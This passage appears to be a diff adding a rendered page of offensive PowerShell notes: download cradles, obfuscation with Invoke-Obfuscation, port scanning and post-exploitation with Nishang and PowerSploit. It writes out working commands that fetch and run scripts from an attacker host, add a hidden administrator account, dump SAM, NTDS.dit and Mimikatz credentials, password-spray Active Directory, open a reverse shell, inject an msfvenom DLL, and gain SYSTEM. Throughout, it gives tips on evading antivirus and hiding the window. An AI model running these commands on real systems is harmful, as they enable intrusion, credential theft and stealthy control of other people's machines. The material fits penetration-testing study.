+</span><span class="n">iex</span><span class="w"> </span><span class="nv">$xmldoc</span><span class="o">.</span><span class="nf">command</span><span class="o">.</span><span class="nf">a</span><span class="o">.</span><span class="nf">execute</span><span class="w">
+
+</span></code></pre></div></div>
+
+<h4 id="com-objects">COM Objects</h4>
+<p>some available</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="n">Msxml2.XMLHTTP</span><span class="w">
+</span><span class="nx">Microsoft.XMLHTTP</span><span class="w">
+</span><span class="n">InternetExplorer.Application</span><span class="w">
+</span><span class="nx">Excel.Application</span><span class="w">
+</span><span class="n">Word.Application</span><span class="w">
+</span><span class="nx">MsXml2.ServerXmlHttp</span><span class="w">
+</span><span class="n">WinHttp.WinHttpRequest.5.1</span><span class="w"> </span><span class="p">(</span><span class="n">Not</span><span class="w"> </span><span class="nx">Proxy</span><span class="w"> </span><span class="nx">Aware</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>it works the same but the New-Object, with <strong>-ComObject</strong> parameter</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$downloader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-ComObject</span><span class="w"> </span><span class="nx">Msxml12.XMLHTTP</span><span class="w">
+</span><span class="nv">$downloader</span><span class="o">.</span><span class="nf">open</span><span class="p">(</span><span class="s2">"GET"</span><span class="p">,</span><span class="w"> </span><span class="s2">"http://&lt;kali ip&gt;/script.ps1"</span><span class="p">,</span><span class="w"> </span><span class="bp">$false</span><span class="p">)</span><span class="w">
+</span><span class="nv">$download</span><span class="o">.</span><span class="nf">send</span><span class="p">()</span><span class="w">
+</span><span class="n">iex</span><span class="w"> </span><span class="nv">$downloader</span><span class="o">.</span><span class="nf">responseText</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>We can do the same with WinHttp.WinHttpRequest.5.1 object as well (in the first line)</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$downloader</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">New-Object</span><span class="w"> </span><span class="nt">-ComObject</span><span class="w"> </span><span class="nx">WinHttp.WinHttpRequest.5.1</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>Tip [+]
+We can use all these commands as one liners, by using a semicolon (;) to break ip the commands
+We can save as script too and execute with <strong>powershell.exe .\script.ps1</strong> 
+Make sure to include -ExecutionPolicy (-ep) and -Window Hidden (-W h)
+This will ensure we can run our scripts and that the powershell window stays hidden from the end-user</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-ExecutionPolicy</span><span class="w"> </span><span class="nx">bypass</span><span class="w"> </span><span class="nt">-Window</span><span class="w"> </span><span class="nx">hidden</span><span class="w"> </span><span class="o">.</span><span class="nx">\downloader.ps1</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>[ extra ]
+A great tool to craft obfuscated download cradles:</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-CradleCrafter</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">https://github.com/danielbohannon/Invoke-CradleCrafter</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="obfuscation">Obfuscation</h2>
+
+<p>Invoke-Obfuscation = https://github.com/danielbohannon/Invoke-Obfuscation</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>- First download
+- Then, find the modules paths
+   → $env:PSModulePath
+	// in this case C:\users\user\Documents\WindowsPowerShell\Modules
+	// After extract to this folder
+- Import the module
+   → Import-Module Invoke-Obfuscation
+- Open it
+   → Invoke-Obfuscation
+</code></pre></div></div>
+
+<h3 id="we-have-several-options">We have several options</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>TOKEN
+AST
+STRING
+ENCODING
+COMPRESS
+LAUNCHER
+</code></pre></div></div>
+
+<h3 id="set-scriptblock">SET SCRIPTBLOCK</h3>
+
+<p>As an example of a script block we can use a standard Net.WebClient download cradle:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">SET</span><span class="w"> </span><span class="nx">SCRIPTBLOCK</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">downloadstring</span><span class="p">(</span><span class="s2">"http://&lt;kali ip&gt;/Get-ProcessPath.ps1"</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="type-of-obfuscation">Type of Obfuscation</h3>
+
+<h4 id="string">STRING</h4>
+
+<p>We are presented with several options For that method:
+	1. Concatenate
+	2. Reorder
+	3. Reverse</p>
+
+<p>In this example <strong>3</strong>
+→ 3</p>
+
+<blockquote>
+  <p>we should get a code obfuscated that we can use in the target machine</p>
+</blockquote>
+
+<h4 id="encoding">Encoding</h4>
+
+<p>// We are presented with options</p>
+<ol>
+  <li>Encode as ASCII</li>
+  <li>Encode as Hex</li>
+  <li>Encode as Octal</li>
+  <li>Encode as Binary</li>
+  <li>Encrypt as SecureString (AES)</li>
+  <li>Encode as BXOR</li>
+  <li>Encode as Special Characters</li>
+  <li>Encode as Whitespace</li>
+</ol>
+
+<ul>
+  <li>Lets pick <strong>7</strong> - Special Characters, For this example
+ → 7</li>
+</ul>
+
+<p>we should get a highly obfuscated payload</p>
+
+<blockquote>
+  <p>[+] If we are operating from a windows command prompt on the target, instead of powershell. We can use:</p>
+</blockquote>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="s2">"&lt;the same payload&gt;"</span><span class="w">
+</span></code></pre></div></div>
+<p>// dont forget the quotes in the payloads</p>
+
+<blockquote>
+  <p>If you wanna use another encoding method, use the RESET options to clear previous methods.</p>
+</blockquote>
+
+<h3 id="obfuscated-launcher">Obfuscated launcher</h3>
+<p>→ LAUNCHER
+there is a lot of options:</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>ps
+cmd
+wmic
+rundll
+var+
+stdin+
+clip+
+var++
+stdin++
+clip++
+rundll++
+mshta++
+</code></pre></div></div>
+
+<ol>
+  <li>We SET SCRIPTBLOCK with the code we want to execute</li>
+  <li>We select an obfuscation method to generate the obfuscated command</li>
+  <li>We then use the LAUNCHER option at the end of this process</li>
+</ol>
+
+<p>in this case we will choose 
+→ RUNDLL</p>
+
+<p>then option <strong>0</strong> - No execution flags
+→ 0</p>
+
+<p>The resulting string, is an obfuscated command that utilizes rundll32.exe with the “SHELL32.DLL” function (ShellExec_RunDLL) which will launch our obfuscated powershell code on the target.</p>
+
+<blockquote>
+  <p>[+] There is an option: <strong>tutorial</strong> that we can use to get some guidance if we are stuck</p>
+</blockquote>
+
+<h3 id="encoded-commands">Encoded Commands</h3>
+<p>its not recommended since it can be easily detected by AV and other string heuristics, considering its just a base64 encoding.</p>
+
+<p>-EncodedCommand parameter in powershell
+	it makes complex commands <strong>digestible</strong> by powershell by encoding everything with Base64.</p>
+
+<h4 id="example">example</h4>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">
+</span><span class="nv">$command</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="s1">'net user admin1 "password" /ADD; net localgroup administrators admin1 /add'</span><span class="w">
+</span><span class="nv">$bytes</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">System.Text.Encoding</span><span class="p">]::</span><span class="n">Unicode.GetBytes</span><span class="p">(</span><span class="nv">$command</span><span class="p">)</span><span class="w">
+</span><span class="nv">$encodedCommand</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">[</span><span class="n">Convert</span><span class="p">]::</span><span class="n">ToBase64String</span><span class="p">(</span><span class="nv">$bytes</span><span class="p">)</span><span class="w">
+
+</span></code></pre></div></div>
+
+<p>we can get the results of our encoded command with:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="err">→</span><span class="w"> </span><span class="n">Write-Host</span><span class="w"> </span><span class="nv">$encodedCommand</span><span class="w">
+</span></code></pre></div></div>
+
+<p>//copy the payload</p>
+
+<p>then execute on the target:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-encodedcommand</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">paste</span><span class="w"> </span><span class="nx">the</span><span class="w"> </span><span class="nx">payload</span><span class="err">&gt;</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="information-gathering--recon">Information Gathering &amp; Recon</h2>
+
+<p>Invoke-Portscan = https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/Invoke-Portscan.ps1
+its included with the powersploit framework</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Portscan</span><span class="w"> </span><span class="nt">-Hosts</span><span class="w"> </span><span class="s2">"192.168.13.1/24"</span><span class="w"> </span><span class="nt">-PingOnly</span><span class="w">
+</span><span class="n">Invoke-Portscan</span><span class="w"> </span><span class="nt">-HostFile</span><span class="w"> </span><span class="nx">ips.txt</span><span class="w"> </span><span class="nt">-PingOnly</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>to save the results we can pipe and export-csv
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Portscan</span><span class="w"> </span><span class="nt">-HostFile</span><span class="w"> </span><span class="nx">ips.txt</span><span class="w"> </span><span class="nt">-PingOnly</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Export-Csv</span><span class="w"> </span><span class="nx">C:\ping_scan.csv</span><span class="w">
+</span></code></pre></div>    </div>
+  </li>
+</ul>
+
+<p>once we have identified live hosts
+we can conduct port scans</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Portscan</span><span class="w"> </span><span class="nt">-HostFile</span><span class="w"> </span><span class="nx">ips.txt</span><span class="w"> </span><span class="nt">-ports</span><span class="w"> </span><span class="s2">"53-81"</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="output-to-gnmap--nmap-format">Output to .gnmap = NMAP format</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-Portscan</span><span class="w"> </span><span class="nt">-HostFile</span><span class="w"> </span><span class="nx">ips.txt</span><span class="w"> </span><span class="nt">-oG</span><span class="w"> </span><span class="nx">port_scan.gnmap</span><span class="w"> </span><span class="nt">-f</span><span class="w"> </span><span class="nt">-ports</span><span class="w"> </span><span class="s2">"1-81"</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="for-enumerating-files">For enumerating Files</h3>
+
+<p>Get-HttpStatus</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-HttpStatus</span><span class="w"> </span><span class="nt">-Target</span><span class="w"> </span><span class="nx">192.168.13.62</span><span class="w"> </span><span class="nt">-Path</span><span class="w"> </span><span class="nx">dictionary.txt</span><span class="w"> </span><span class="nt">-Port</span><span class="w"> </span><span class="nx">80</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">Status</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"ok"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="host-discovery-with-posh-secmod-framework">Host Discovery with Posh-SecMod framework</h3>
+<p>Invoke-ARPScan = https://github.com/darkoperator/Posh-SecMod</p>
+
+<p>it may generate fewer alerts than your usual SYN or TCP scan</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-ARPScan</span><span class="w"> </span><span class="nt">-CIDR</span><span class="w"> </span><span class="nx">192.168.13.1/24</span><span class="w">
+</span></code></pre></div></div>
+
+<p>Get-Command -Module Posh-SecMod
+// to view the available options</p>
+
+<h3 id="dns-related">DNS related</h3>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-ReverseDnsLookup</span><span class="w"> </span><span class="nt">-CIDR</span><span class="w"> </span><span class="nx">192.168.13.0/24</span><span class="w">
+</span><span class="n">Get-Help</span><span class="w"> </span><span class="nx">Resolve-HostRecord</span><span class="w"> </span><span class="nt">-Examples</span><span class="w">
+</span><span class="n">Get-Help</span><span class="w"> </span><span class="nx">Resolve-DNSRecord</span><span class="w"> </span><span class="nt">-Examples</span><span class="w">
+</span></code></pre></div></div>
+
+<h2 id="post-exploitation-with-powershell">Post-Exploitation with PowerShell</h2>
+
+<p>post-exploitation framework Nishang = https://github.com/samratashok/nishang</p>
+
+<p>// as always, download the framework and host with a web server</p>
+
+<ul>
+  <li>Nishang</li>
+</ul>
+
+<h3 id="copy-vss-module">Copy-VSS module</h3>
+<p>will attempt to copy the SAM database using VSS service, and if run on a domain controller, will try and copy the NTDS.dit and contents of the system registry hive.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"http://&lt;kali ip&gt;/Copy-VSS.ps1"</span><span class="p">);</span><span class="w"> </span><span class="nx">Copy-VSS</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="get-information">Get-Information</h3>
+<p>get a lot of system information</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"http://&lt;kali ip&gt;/Get-Information.ps1"</span><span class="p">);</span><span class="w"> </span><span class="nx">Get-Information</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="get-passhints">Get-PassHints</h3>
+<p>we can use to dump the saved password hints For users on the system:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"http://&lt;kali ip&gt;/Get-PassHints.ps1"</span><span class="p">);</span><span class="w"> </span><span class="nx">Get-PassHints</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="invoke-mimikatz">Invoke-Mimikatz</h3>
+<p>Will dump clear-text credentials or hashes from memory.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"http://&lt;kali ip&gt;/Invoke-Mimikatz.ps1"</span><span class="p">);</span><span class="w"> </span><span class="nx">Invoke-Mimikatz</span><span class="w"> </span><span class="nt">-DumpCreds</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>There is plenty more in Nishang <strong>gather</strong> modules
+moreover = https://github.com/samratashok/nishang#gather</p>
+</blockquote>
+
+<h3 id="invoke-bruteforce">Invoke-BruteForce</h3>
+<p>We can use this to brute force Active Directory accounts, SQL Server, Web or FTP servers.
+Invoke-BruteForce is great tool For executing a password spray attack against Active Directory
+Just ensure that your password list contains a single password.</p>
+
+<p>→ Get-Help Invoke-BruteForce</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-BruteForce</span><span class="w"> </span><span class="nt">-ComputerName</span><span class="w"> </span><span class="nx">targetdomain.com</span><span class="w"> </span><span class="nt">-UserList</span><span class="w"> </span><span class="nx">C:\temp\users.txt</span><span class="w"> </span><span class="nt">-PasswordList</span><span class="w"> </span><span class="nx">C:\temp\pwds.txt</span><span class="w"> </span><span class="nt">-Service</span><span class="w"> </span><span class="nx">ActiveDirectory</span><span class="w"> </span><span class="nt">-StopOnSuccess</span><span class="w"> </span><span class="nt">-Verbose</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="reverse-shell---invoke-powershelltcp">Reverse Shell - Invoke-PowerShellTcp</h3>
+<p>provides a way to obtain a reverse PowerShell from our target host back to a netcat listener
+the traffic is traversing the wire in cleartext between attacker and target.
+although a great and undetected by AV method to get a reverse shell from PowerShell, over-the-wire (SIEM) may pick up some chatter if that type of solution has been implemented within an organization.</p>
+
+<ul>
+  <li>Open a listener in the attacker:</li>
+</ul>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>nc <span class="nt">-lvnp</span> 4444
+</code></pre></div></div>
+<ul>
+  <li>Execute the command in the target to grab the file and get the reverse shell:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">powershell.exe</span><span class="w"> </span><span class="nt">-Command</span><span class="w"> </span><span class="nx">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.WebClient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s2">"http://&lt;kali ip&gt;/Invoke-PowerShellTcp.ps1"</span><span class="p">);</span><span class="w"> </span><span class="nx">Invoke-PowerShellTcp</span><span class="w"> </span><span class="nt">-Reverse</span><span class="w"> </span><span class="nt">-IPAddress</span><span class="w"> </span><span class="err">&lt;</span><span class="nx">kali</span><span class="w"> </span><span class="nx">ip</span><span class="err">&gt;</span><span class="w"> </span><span class="nt">-Port</span><span class="w"> </span><span class="nx">4444</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>There is a lot more shells available in Nishang framework.
+// bind, reverse, ICMP, UDP, RAT, etc
+    <div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-JSRatRegsvr.ps1</span><span class="w">
+</span><span class="nx">Invoke-JSRatRundll.ps1</span><span class="w">
+</span><span class="n">Invoke-PoshRatHttp.ps1</span><span class="w">
+</span><span class="nx">Invoke-PoshRatHttps.ps1</span><span class="w">
+</span><span class="n">Invoke-PowerShellIcmp.ps1</span><span class="w">
+</span><span class="nx">Invoke-PowerShellTcp.ps1</span><span class="w">
+</span><span class="n">Invoke-PowerShellTcpOneLine.ps1</span><span class="w">
+</span><span class="nx">Invoke-PowerShellTcpOneLineBind.ps1</span><span class="w">
+</span><span class="n">Invoke-PowerShellUdp.ps1</span><span class="w">
+</span><span class="nx">Invoke-PowerShellUdpOneLine.ps1</span><span class="w">
+</span><span class="n">Invoke-PsGcat.ps1</span><span class="w">
+</span><span class="nx">Invoke-PsGcatAgent.ps1</span><span class="w">
+</span><span class="n">Remove-PoshRat.ps1</span><span class="w">
+</span></code></pre></div>    </div>
+  </li>
+  <li>Nishang has other categories modules as well:</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ActiveDirectory</span><span class="w">
+</span><span class="nx">Antak-WebShell</span><span class="w">
+</span><span class="n">Backdoors</span><span class="w">
+</span><span class="nx">Bypass</span><span class="w">
+</span><span class="n">Client</span><span class="w">
+</span><span class="nx">Escalation</span><span class="w">
+</span><span class="n">Execution</span><span class="w">
+</span><span class="nx">Gather</span><span class="w">
+</span><span class="n">MITM</span><span class="w">
+</span><span class="nx">Misc</span><span class="w">
+</span><span class="n">Pivot</span><span class="w">
+</span><span class="nx">Prasadhak</span><span class="w">
+</span><span class="n">Scan</span><span class="w">
+</span><span class="nx">Shells</span><span class="w">
+</span><span class="n">Utility</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>PowerSploit</li>
+</ul>
+
+<p>Tools For post-exploitation:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">AntivirusBypass</span><span class="w">
+</span><span class="nx">Code</span><span class="w"> </span><span class="nx">Execution</span><span class="w">
+</span><span class="n">Exfiltration</span><span class="w">
+</span><span class="nx">Mayhem</span><span class="w">
+</span><span class="n">Persistence</span><span class="w">
+</span><span class="nx">Privesc</span><span class="w">
+</span><span class="n">Recon</span><span class="w">
+</span><span class="nx">ScriptModification</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="powerup">PowerUp</h3>
+<p>its a module within the Privesc Category
+we can first import the Privesc module from within the Privesc modules directory and have a look at some of the options we have:</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Modules\PowerSploit\Privesc</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Import-Module</span><span class="w"> </span><span class="o">.</span><span class="nx">\Privesc.psm1</span><span class="w">
+</span><span class="n">Get-Command</span><span class="w"> </span><span class="nt">-Module</span><span class="w"> </span><span class="nx">Privesc</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Invoke-AllChecks:
+// will run all functions related to the Privesc module looking For misconfigurations, permissions issues with services, opportunities For DLL hijacking a number of other useful checks.</li>
+</ul>
+
+<p>// We can invoke it on the target after we have imported the Privesc.psm1 module with the “Invoke-AllChecks” command.</p>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">C:\Modules\PowerSploit\Privesc</span><span class="err">&gt;</span><span class="w"> </span><span class="nx">Invoke-AllChecks</span><span class="w">
+</span></code></pre></div></div>
+
+<p>The output will also indicate an <strong>AbuseFunction</strong> we can use to further exploit the target. 
+In this case, PowerUp identified a potential service binary we can install with the “Install-ServiceBinary -Name ‘ClickToRunSvc’ command”</p>
+
+<h3 id="powersploit---save-to-html">PowerSploit - Save to HTML</h3>
+<p>the file will be saved in the current directory MACHINENAME.USERNAME.html</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Invoke-AllChecks</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="nx">HTMLReport</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="codeinjection-category">CodeInjection category</h3>
+<p>we can inject our own code into existing processes on the target system, whether it be via DLL injection, injecting our own custom Shellcode into an existing process, or using WMI to execute commands on the target.</p>
+
+<h3 id="invoke-dllinjection">Invoke-DLLInjection</h3>
+<p>this function injects an attacker-defined DLL into any existing process ID on the target system.</p>
+
+<div class="language-bash highlighter-rouge"><div class="highlight"><pre class="highlight"><code>msfvenom <span class="nt">-p</span> windows/exec <span class="nv">CMD</span><span class="o">=</span><span class="s2">"cmd.exe"</span> <span class="nt">-f</span> dll <span class="o">&gt;</span> cmd.dll
+</code></pre></div></div>
+
+<p>open a web host:
+grab the file:</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.Webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadFile</span><span class="p">(</span><span class="s1">'http://&lt;kali ip&gt;/cmd.dll'</span><span class="p">,</span><span class="w"> </span><span class="s1">'C:\programdata\cmd.dll'</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>Identify a process on the target system we would like to inject our DLL into.</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ps</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ProcessName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"notepad"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>After grabbing the PID of the choosen process
+We can grab the Invoke-DLLInjection and execute it to inject our malicious dll in the PID of the process</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">iex</span><span class="w"> </span><span class="p">(</span><span class="n">New-Object</span><span class="w"> </span><span class="nx">Net.Webclient</span><span class="p">)</span><span class="o">.</span><span class="nf">DownloadString</span><span class="p">(</span><span class="s1">'http://&lt;kali ip&gt;/Invoke-DLLInjection.ps1'</span><span class="p">);</span><span class="w"> </span><span class="nx">Invoke-DLLInjection</span><span class="w"> </span><span class="nt">-ProcessID</span><span class="w"> </span><span class="nx">7420</span><span class="w"> </span><span class="nx">C:\programdata\cmd.dll</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>once that in complete, we can run “ps” command again, to confirm that we have a “cmd” process which has been spawned from our DLL injection operation, which is created in a new process thread.</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">ps</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="nf">?</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">ProcessName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"cmd"</span><span class="p">}</span><span class="w">
+</span></code></pre></div></div>
+
+<h3 id="more-about-dll-injection">More about DLL injection</h3>
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>http://blog.opensecurityresearch.com/2013/01/windows-dll-injection-basics.html
+</code></pre></div></div>
+
+<ul>
+  <li>psgetsystem</li>
+</ul>
+
+<p>// another tool</p>
+
+<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>https://github.com/decoder-it/psgetsystem
+</code></pre></div></div>
+
+<p>psgetsystem allows us to get SYSTEM privileges via a parent process, which then spawns a child process which effectively inherits the SYSTEM access privileges of the parent.
+Although this tool needs to be run as Administrator, its a great way to evade application whitelisting solutions by being to inject ourselves into an already signed or other trusted process.</p>
+
+<p>After send the script to the target</p>
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">	</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\psgetsys.ps1</span><span class="w">
+	</span><span class="p">[</span><span class="n">MyProcess</span><span class="p">]::</span><span class="nx">CreateProcessFromParent</span><span class="p">(</span><span class="err">&lt;</span><span class="n">system_id</span><span class="err">&gt;</span><span class="p">,</span><span class="w"> </span><span class="s2">"&lt;Command to execute&gt;"</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<ul>
+  <li>First we need to identify some SYSTEM processes</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="n">Get-Process</span><span class="w"> </span><span class="nt">-IncludeUserName</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Where-Object</span><span class="w"> </span><span class="p">{</span><span class="bp">$_</span><span class="o">.</span><span class="nf">UserName</span><span class="w"> </span><span class="o">-match</span><span class="w"> </span><span class="s2">"SYSTEM"</span><span class="p">}</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">Format-List</span><span class="w"> </span><span class="nt">-Property</span><span class="w"> </span><span class="nx">Username</span><span class="p">,</span><span class="nx">Name</span><span class="p">,</span><span class="nx">Id</span><span class="w">
+</span></code></pre></div></div>
+
+<p>This should return a list of all SYSTEM-owned processes along with their PIDs and process names.
+in this case we will use <strong>ZeroConfigService</strong></p>
+
+<ul>
+  <li>This will launch a cmd.exe prompt, but as a child process of the SYSTEM-owned ZeroConfigService.exe process, and as a result, our <strong>child</strong> process, will also be SYSTEM.</li>
+</ul>
+
+<div class="language-powershell highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="w">	</span><span class="o">.</span><span class="w"> </span><span class="o">.</span><span class="n">\psgetsys.ps1</span><span class="w">
+	</span><span class="p">[</span><span class="n">MyProcess</span><span class="p">]::</span><span class="nx">CreateProcessFromParent</span><span class="p">(</span><span class="mi">3632</span><span class="p">,</span><span class="s2">"cmd.exe"</span><span class="p">)</span><span class="w">
+</span></code></pre></div></div>
+
+<blockquote>
+  <p>we can confirm this by running a tool like Process Explorer, to see that our cmd.exe process has been spawned as a child process of the ZeroConfigService process and is also SYSTEM.</p>
+</blockquote>
+
+<blockquote>
+  <p>of course, in an attack scenario, we could launch a meterpreter executable payload as SYSTEM and get a SYSTEM shell from the target machine.</p>
+</blockquote>
+
+<ul>
+  <li>
+    <p>Empire</p>
+
+    <p>https://github.com/EmpireProject/Empire</p>
+  </li>
+</ul>
+
+<blockquote>
+  <p>Another post-exploitation framework
+Its main advantage is that is implements powershell functionality without requiring the existence of powershell on a target machine.</p>
+</blockquote>
+
+<h2 id="powershell-and-metasploit">Powershell and Metasploit</h2>
+
+<p>set a handler in meterpreter
+make a payload in msfvenom = -f psh-reflection &gt; payload.ps1
+make a web host to send the payload to the target</p>
+<div class="language-python highlighter-rouge"><div class="highlight"><pre class="highlight"><code>	<span class="n">python</span> <span class="o">-</span><span class="n">m</span> <span class="n">http</span><span class="p">.</span><span class="n">server</span>
+</code></pre></div></div>
+
+<p>grab the file in the target machine:</p>
